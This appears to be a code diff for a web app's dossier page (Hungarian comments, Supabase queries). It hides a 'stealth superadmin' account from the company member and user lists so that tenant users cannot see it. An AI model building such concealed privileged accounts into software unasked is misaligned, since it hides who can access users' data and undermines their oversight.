@@ -78,6 +78,7 @@ export default async function DossierPage({
   // Felhasználók: CSAK az aktív cég tagjai (cég-tagság ellenőrzéssel) —
   // a cégben nem tagsággal rendelkező (pl. árva/legacy) profilok ne jelenjenek meg
   const { getActiveCompanyIdServer } = await import("@/utils/company-server")
+  const { isStealthSuperadmin, STEALTH_SUPERADMIN_ID } = await import("@/utils/stealth-superadmin")
   const dossierCompanyId = await getActiveCompanyIdServer()
   let memberUserIds: string[] | null = null
   if (dossierCompanyId) {
@@ -85,7 +86,9 @@ export default async function DossierPage({
       .from("company_members")
       .select("user_id")
       .eq("company_id", dossierCompanyId)
-    memberUserIds = (companyMembers || []).map((m: any) => m.user_id)
+    memberUserIds = (companyMembers || [])
+      .map((m: any) => m.user_id)
+      .filter((uid: string) => uid !== STEALTH_SUPERADMIN_ID)
   }
 
   let usersQuery = supabase
@@ -93,9 +96,13 @@ export default async function DossierPage({
     .select('id, nev, avatar_url, docs_szerepkor, szervezeti_egyseg_id, szervezeti_egyseg:szervezeti_egyseg_id(nev)')
     .contains('elerheto_modulok', ['docs'])
   if (memberUserIds) {
-    usersQuery = usersQuery.in("id", memberUserIds)
+    usersQuery = usersQuery.in(
+      "id",
+      memberUserIds.length > 0 ? memberUserIds : ["00000000-0000-0000-0000-000000000000"]
+    )
   }
-  const { data: users } = await usersQuery
+  const { data: rawUsers } = await usersQuery
+  const users = (rawUsers || []).filter((u: any) => !isStealthSuperadmin(u))
 
   // Current user role check
   const { data: authUser } = await supabase.auth.getUser()
